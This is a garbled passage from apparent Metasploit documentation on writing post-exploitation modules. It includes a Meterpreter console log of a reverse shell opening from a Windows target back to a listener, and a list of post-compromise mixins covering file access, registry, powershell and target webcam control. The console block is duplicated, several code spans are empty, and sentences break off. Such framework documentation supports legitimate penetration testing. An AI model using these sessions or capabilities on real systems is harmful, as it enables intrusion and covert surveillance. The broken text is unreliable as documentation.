## Plan your module
Another important thing is to think about how your module will perform on different distributions/systems. For example, say you want to run a
```msf
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.64:4444 
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.1.106
[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55157) at 2014-07-31 17:59:36 -0500

meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>> session.class
=> Msf::Sessions::Meterpreter_x86_Win
```

`msf
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.64:4444 
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.1.106
[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55157) at 2014-07-31 17:59:36 -0500

meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>> session.class
=> Msf::Sessions::Meterpreter_x86_Win
`

` mixin. When you create a post module with this mixin, a lot of other mixins are also already included for all kinds of scenarios, to be more specific:

* **[msf/core/post/common](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/common.rb)** - Common methods post modules use, for example: `

`.
* **[msf/core/post_mixin](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post_mixin.rb)** - Keeps track of the session state.
* **[msf/core/post/file](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/file.rb)** - File system related methods.
* **[msf/core/post/webrtc](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/webrtc.rb)** - Uses WebRTC to interact with the target machine's webcam.
* **[msf/core/post/linux](https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post/linux)** - There actually isn't a lot going on, just `

` specifically for Linux.
* **[msf/core/post/osx](https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post/osx)** - `

`, and methods for operating the target machine's webcam.
* **[msf/core/post/solaris](https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post/solaris)** - Pretty much like the linux mixin. Same methods, but for Solaris.
* **[msf/core/post/unix](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/unix.rb)** - `

`
* **[msf/core/post/windows](https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post/windows)** - Most of the development time are spent here. From Windows account management, event log, file info, Railgun, LDAP, netapi, powershell, registry, wmic, services, etc.

### Template

Here we have a post module template. As you can see, there are some required fields that need to be filled. We'll explain each:

`

